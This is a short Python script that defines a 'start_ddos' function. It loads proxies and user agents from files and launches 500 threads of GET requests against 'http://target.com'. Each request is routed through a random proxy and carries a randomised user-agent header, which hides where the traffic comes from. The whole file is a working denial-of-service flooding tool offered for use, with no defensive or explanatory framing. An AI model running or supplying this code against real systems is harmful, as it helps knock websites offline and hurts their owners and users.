import requests
import random
from threading import Thread


def read_proxies(file_name):
    with open(file_name, 'r') as file:
        proxies = file.readlines()
    return [proxy.strip() for proxy in proxies]  


def read_user_agents(file_name):
    with open(file_name, 'r') as file:
        user_agents = file.readlines()
    return [ua.strip() for ua in user_agents]  


def send_request(url, proxy, user_agent):
    headers = {'User-Agent': user_agent}
    proxies = {'http': proxy, 'https': proxy}
    
    try:
        response = requests.get(url, headers=headers, proxies=proxies)
        print(f"Request sent with status code: {response.status_code} from {proxy} using {user_agent}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


def start_ddos(url, proxies_list, user_agents_list, num_threads):
    threads = []
    for _ in range(num_threads):
        proxy = random.choice(proxies_list)
        user_agent = random.choice(user_agents_list)
        thread = Thread(target=send_request, args=(url, proxy, user_agent))
        threads.append(thread)
        thread.start()
    
    
    for thread in threads:
        thread.join()


proxies_list = read_proxies('proxies.txt')  # Ανάγνωση proxies από το αρχείο
user_agents_list = read_user_agents('user_agents.txt')  # Ανάγνωση user agents από το αρχείο

url = 'http://target.com'
num_threads = 500
start_ddos(url, proxies_list, user_agents_list, num_threads)
